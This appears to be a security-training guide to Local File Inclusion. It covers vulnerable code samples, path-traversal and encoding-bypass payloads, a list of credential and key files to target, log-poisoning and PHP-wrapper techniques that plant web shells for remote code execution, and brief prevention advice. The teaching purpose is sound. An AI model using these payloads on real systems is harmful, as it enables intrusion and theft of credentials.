# Local File Inclusion (LFI)

## Overview

Local File Inclusion (LFI) is a vulnerability that allows attackers to include files from the server's local filesystem through the web application. This can lead to sensitive file disclosure, code execution, and system compromise.

## How LFI Works

1. **Application includes files dynamically** based on user input
2. **Attacker manipulates input** to include unauthorized files
3. **Server processes malicious request** and includes the file
4. **Sensitive data exposed** or code executed

## Vulnerable Code Examples

### PHP
```php
<?php
// VULNERABLE CODE
$page = $_GET['page'];
include($page . ".php");
?>

// Exploit: ?page=../../etc/passwd
```

### Python (Flask)
```python
# VULNERABLE CODE
from flask import request, render_template

@app.route('/page')
def show_page():
    page = request.args.get('page')
    return render_template(page)  # Vulnerable!

# Exploit: /page?page=../../../etc/passwd
```

### Node.js
```javascript
// VULNERABLE CODE
app.get('/page', (req, res) => {
    const page = req.query.page;
    res.sendFile(__dirname + '/' + page);  // Vulnerable!
});

// Exploit: /page?page=../../../etc/passwd
```

## Common Attack Vectors

### 1. Directory Traversal (Path Traversal)

**Basic Traversal**:
```
?file=../../../../etc/passwd
?page=../../../windows/win.ini
```

**With Extension Bypass**:
```
// If .php is appended
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd%2500
?file=../../../../etc/passwd/. 
```

### 2. Null Byte Injection (PHP < 5.3)

```
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd%00.jpg
```

### 3. Encoding Bypasses

```
// URL Encoding
?file=..%2f..%2f..%2fetc%2fpasswd

// Double Encoding
?file=..%252f..%252f..%252fetc%252fpasswd

// Unicode Encoding
?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

## Interesting Files to Target

### Linux Systems
```
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (if accessible)
/etc/hosts               # Host configurations
/etc/apache2/apache2.conf    # Apache config
/etc/nginx/nginx.conf    # Nginx config
/var/log/apache2/access.log  # Apache logs
/var/log/nginx/access.log    # Nginx logs
/proc/self/environ       # Environment variables
/proc/self/cmdline       # Command line
~/.ssh/id_rsa            # SSH private keys
~/.bash_history          # Command history
/var/www/html/config.php # Application config
```

### Windows Systems
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\Windows\repair\SAM
C:\Windows\System32\config\SAM
```

### Application Files
```
../config.php
../database.php
../../includes/config.inc.php
../../../application/config/database.php
../.env                  # Environment variables
../composer.json
../package.json
```

## Testing in DVWA

1. Navigate to "File Inclusion" section
2. Set security level to "Low"
3. Test with these payloads:

```
?page=../../../../../../etc/passwd
?page=../../../../../../etc/hosts
?page=../../../../../../proc/self/environ
?page=php://filter/convert.base64-encode/resource=index
```

## Log Poisoning (LFI to RCE)

### Apache Log Poisoning

1. **Poison the log** with PHP code:
```bash
# Send request with PHP code in User-Agent
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
```

2. **Include the log file**:
```
?file=../../../../../../var/log/apache2/access.log&cmd=whoami
```

### SSH Log Poisoning

1. **Attempt SSH connection** with PHP code:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

2. **Include SSH log**:
```
?file=../../../../../../var/log/auth.log&cmd=whoami
```

## PHP Wrappers

### php://filter

**Read source code (Base64 encoded)**:
```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=config.php
```

**ROT13 encoding**:
```
?file=php://filter/read=string.rot13/resource=index.php
```

### php://input

**Upload PHP code via POST**:
```php
// Request
POST /page.php?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('whoami'); ?>
```

### data://

```
?file=data://text/plain,<?php system('whoami'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

### expect://

```
?file=expect://whoami
?file=expect://id
```

## Advanced Techniques

### Zip Wrapper

1. **Create malicious zip**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
```

2. **Upload and include**:
```
?file=zip://uploads/shell.zip%23shell.php&cmd=whoami
```

### Phar Wrapper

```php
// Create phar archive with payload
?file=phar://uploads/file.phar/shell.php
```

## Real-World Impact

- **Data Breach**: Exposure of configuration files with credentials
- **Code Execution**: Escalation to RCE through log poisoning
- **Privilege Escalation**: Access to privileged user files
- **Information Disclosure**: Source code exposure

## Detection

1. **Identify file operation parameters**
   - ?file=, ?page=, ?include=, ?doc=, ?lang=
   
2. **Test with simple traversal**
   ```
   ?file=../
   ?file=../../
   ```

3. **Attempt to read known files**
   ```
   ?file=../../../etc/passwd
   ```

4. **Check response for file contents**

## Prevention

See the main LFI guide for comprehensive prevention techniques.

### Basic Prevention

1. **Whitelist allowed files**:
```php
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die("Invalid page");
}
include($page . ".php");
```

2. **Use basename()**:
```php
$file = basename($_GET['file']);
include($file);
```

3. **Strict path validation**:
```php
$file = realpath($_GET['file']);
$base = realpath('/var/www/html/includes/');

if (strpos($file, $base) !== 0) {
    die("Access denied");
}
include($file);
```

## References

- OWASP File Inclusion
- OWASP Path Traversal
- PortSwigger File Path Traversal
- HackTricks LFI Guide
